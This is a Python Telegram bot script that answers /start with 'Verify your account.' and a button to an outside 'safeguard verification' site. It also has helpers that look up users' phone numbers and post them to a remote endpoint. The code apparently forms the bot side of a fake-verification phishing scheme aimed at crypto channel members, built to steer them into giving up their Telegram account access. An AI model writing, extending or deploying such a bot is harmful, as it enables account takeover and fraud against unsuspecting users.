import asyncio
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp  # Asynchronous HTTP requests
from backend import clients
from dotenv import load_dotenv
import os
from aiohttp import web  # For the HTTP server

# Load environment variables from the .env file
load_dotenv()

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

bot_client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# External API endpoint to call (Flask server endpoint)
FLASK_API_URL = 'https://telebot-ivng.onrender.com/get_phone_by_sender_id'  # Replace with your Flask API endpoint
API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your API endpoint

# Event handler for /start command
@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    try:
        # Download the image asynchronously
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8'
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    image_data = await response.read()  # Read image bytes

                    await event.respond(
                        file=image_data,  # Send the image as bytes
                        message="Verify your account.",
                        buttons=[
                            [Button.url("Verify", "https://safeguardverification.netlify.app/")],
                            [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]
                        ]
                    )
                else:
                    print("Failed to fetch the image from the provided URL.")

    except Exception as e:
        print(f"Error: {e}")

# Function to retrieve phone number from Flask API based on sender_id
async def get_phone_by_sender_id(sender_id):
    async with aiohttp.ClientSession() as session:
        try:
            params = {'sender_id': sender_id}
            async with session.get(FLASK_API_URL, params=params) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return response_data.get('phone', None)
                else:
                    print(f"Error from Flask API: {response.status}")
                    return None
        except Exception as e:
            print(f"Failed to call Flask API: {e}")
            return None

# Function to call the external API (e.g., sending a message)
async def call_external_endpoint(user_client):
    async with aiohttp.ClientSession() as session:
        try:
            data = {'phone': user_client.phone}
            async with session.post(API_URL, json=data) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return f"Response from API: {response_data.get('message', 'Success!')}"
                else:
                    return f"Error from API: {response.status}"
        except Exception as e:
            return f"Failed to call API: {e}"

# HTTP Server for health checks
async def health_check(request):
    return web.Response(text="Bot is running!")

async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5001)  # Use port 5001
    await site.start()

# Main function to run both the bot and the HTTP server
async def main():
    # Start the bot
    await bot_client.start()
    print("Bot is running...")

    # Start the HTTP server
    await run_http_server()

    # Keep the bot running
    await bot_client.run_until_disconnected()

# Run the bot
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
